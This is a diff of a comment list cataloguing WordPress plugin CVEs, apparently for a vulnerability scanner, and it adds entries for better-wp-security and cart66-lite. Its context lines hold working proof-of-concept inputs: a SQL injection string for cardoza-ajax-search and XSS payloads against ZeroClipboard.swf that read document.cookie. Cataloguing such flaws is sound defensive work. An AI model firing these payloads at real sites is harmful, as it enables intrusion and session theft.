@@ -4,8 +4,11 @@
 # https://vexatioustendencies.com/wordpress-plugin-vulnerability-dump-part-2/
 # CVE-2003-1599
 # CVE-2012-3351
+# CVE-2012-4263 better-wp-security 3.2.5
+# CVE-2012-4264 better-wp-security 3.2.5
 # CVE-2012-5853 cardoza-ajax-search http://seclists.org/bugtraq/2012/Nov/33 /wp-admin/admin-ajax.php/?srch_txt='or 1=1-- &action=the_search_text
 # CVE-2012-XXXX answer-my-question http://osvdb.org/85567 http://seclists.org/bugtraq/2012/Nov/24
+# CVE-2012-XXXX better-wp-security 3.5.4
 # CVE-2013-1808 WP-Table Reloaded and lots of others
 # CVE-2013-1808 bp-code-snippets wp-content/plugins/bp-code-snippets/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height http://www.openwall.com/lists/oss-security/2013/03/26/8
 # CVE-2013-1808 buckets wp-content/plugins/buckets/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
@@ -22,6 +25,8 @@
 # CVE-2013-1808 wp-link-to-us wp-content/plugins/wp-link-to-us/js/ZeroClipboard.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height wp-content/plugins/wp-link-to-us/js/ZeroClipboard10.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
 # CVE-2013-1808 wppygments wp-content/plugins/wppygments/js/ZeroClipboard.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height wp-content/plugins/wppygments/js/ZeroClipboard10.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
 # CVE-2013-1808 zopim-live-chat wp-content/plugins/zopim-live-chat/ZeroClipboard.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
+# CVE-2013-5977 cart66-lite
+# CVE-2013-5978 cart66-lite
 # CVE-2013-7129 Jplayer.swf ExternalInterface.call() method jQuery parameter XSS http://osvdb.org/92254
 # CVE-2013-7240 advanced-dewplayer N/A
 # CVE-2013-XXXX advanced-xml-reader http://www.openwall.com/lists/oss-security/2013/05/06/1
